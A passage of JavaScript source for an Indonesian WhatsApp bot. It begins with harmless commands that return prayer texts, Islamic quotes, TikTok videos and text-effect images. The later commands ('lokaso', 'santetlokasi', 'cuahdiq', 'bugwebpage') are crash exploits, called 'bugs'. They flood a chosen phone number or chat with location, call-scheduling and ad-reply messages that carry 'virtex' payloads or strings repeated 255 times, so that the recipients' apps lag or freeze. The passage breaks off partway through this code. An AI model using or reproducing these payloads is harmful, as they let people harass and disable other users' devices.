      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    reply(`${contoh} + ${data}`)
}
break
//=========================================\\
case 'doaharian': {
    let src = JSON.parse(fs.readFileSync('./database/doaharian.json', 'utf-8'))
    let caption = src.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    reply(`${caption}`)

}
break
//=========================================\\   
case 'niatsholat': {
    if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
//=========================================\\
case 'vidgalau': case 'videogalau': {
reply(mess.wait)

    function formatViews(views) {
        let form = views.toString();
        let formatv;
        if (form.length > 6) {
            formatv = (views / 1000000).toFixed(1) + 'M';
        } else if (form.length > 4) {
            formatv = (views / 1000).toFixed(2) + 'K';
        } else {
            formatv = form;
        }
        return formatv;
    }

    async function createVideo(url) {
        const { videoMessage } = await generateWAMessageContent({ video: { url } }, { upload: slime.waUploadToServer });
        return videoMessage;
    }

    function shuffleArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1)); // Perbaikan di sini
            [array[i], array[j]] = [array[j], array[i]];
        }
    }

    let push = [];
    let { data } = await axios.get(`https://widipe.com/tiktoksearch?text=galau`);
    let res = data.result.data;
    shuffleArray(res); // Mengacak array
    let ult = res.splice(0, 3); // Jumlah video yang ingin dikirim
    let i = 1;

    for (let lucuy of ult) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Title:* ${lucuy.title}\n*Author:* ${lucuy.author.nickname}`
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: `👁️: ${formatViews(lucuy.play_count)}\n❤️: ${formatViews(lucuy.digg_count)}\n💬: ${formatViews(lucuy.comment_count)}\n➡️: ${formatViews(lucuy.share_count)}`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '',
                hasMediaAttachment: true,
                videoMessage: await createVideo(lucuy.play)
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    const bot = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Ini dia dek *video galau* nya`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'By: SlimexTzy',
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [...push]
                    })
                })
            }
        }
    }, { quoted: m });

    await slime.relayMessage(m.chat, bot.message, { messageId: bot.key.id });
}
break;
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    reply(`${arabic}\n${arti}`)
}
break
//=========================================\\
case 'doatahlil': {
    let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
    let caption = result.map((v, i) => {
        return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
    }).join('\n\n')
    reply(`${caption}`)
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return reply(`Example : ${prefix+command} slime`) 
reply(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
slime.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'cuahdiq': {
const cap = `${ngazap(prefix)}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
slime.relayMessage(m.chat, { scheduledCallCreationMessage: { callType: "2", scheduledTimestampMs: Date.now, title: cap}},{ messageId: scheduledCallCreationMessage })

}
break
//===============================================


case "lokaso":{
if (!isCreator) return m.reply('*khusus Premium*')
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var locationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
					"degreesLatitude": 37.3898048400879,
"name": `${virtex7(prefix)}`,
					"degreesLongitude": -122.08141326904297,
					"jpegThumbnail": thumb
				}
}), { userJid: from, quoted:m})
slime.relayMessage(from, locationMessage.message, { messageId: locationMessage.key.id })
}
}

//===============================================
case "santetlokasi":{
if (!isCreator) return m.reply('*khusus Premium*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214181312`)
Pshsisj = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
					"degreesLatitude": 37.3898048400879,
"name": `${virtex7}`,
					"degreesLongitude": -122.08141326904297,
					"jpegThumbnail": thumb
				}
}), { userJid: from, quoted:m})
slime.relayMessage(Pshsisj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id })
}
m.reply(`Sukses Mengirim Bug`)
}
break
//===============================================

//===============================================
case "bugwebpage":
if (!isPrem) return reply('Khusud Prem Yang Mau Buy Prem Ke Owner')
        for (i = 0; i < 10; i++) {
          const ikale = {
            remoteJid: ''
          };
          const ikale2 = {
            'fromMe': [],
            'participant': "0@s.whatsapp.net",
            ...(m.chat ? ikale : {})
          };
          const ikuakle = {
            url: "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
            fileSha256: "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
            fileEncSha256: "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
            mediaKey: "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
            mimetype: "image/webp",
            height: 0x28,
            width: 0x28,
            directPath: "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
            fileLength: "99999999",
            mediaKeyTimestamp: "16572901099967",
            isAnimated: []
          };
          const ajuan = {
            stickerMessage: ikuakle
          };
          const batuo = {
            key: ikale2,
            message: ajuan
          };
          const jajane = {
            quoted: batuo
          };
          slime.sendMessage(m.chat, {
            'text': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY SLIMEXTZY" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
                'mediaType': 0x1
              }
            }
          }, jajane);
          await sleep(2000);
          const pencu = {
            quoted: batuo
          };
          slime.sendMessage(m.chat, {
            'text': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY SLIMEXTZY" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
                'mediaType': 0x1
              }
            }
          }, pencu);
          await sleep(2000);
          const pencu1 = {
            quoted: batuo
          };
          slime.sendMessage(m.chat, {
            'text': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY SLIMEXTZY" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
                'mediaType': 0x1
              }
            }
          }, pencu1);
          await sleep(2000);
          const tilol = {
            quoted: batuo
          };
          slime.sendMessage(m.chat, {
            'text': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY SLIMEXTZY" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
                'mediaType': 0x1
              }
            }
          }, tilol);
          await sleep(2000);
          const tilol1 = {
            quoted: batuo
          };
          slime.sendMessage(m.chat, {
            'text': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
            'contextInfo': {
              'externalAdReply': {
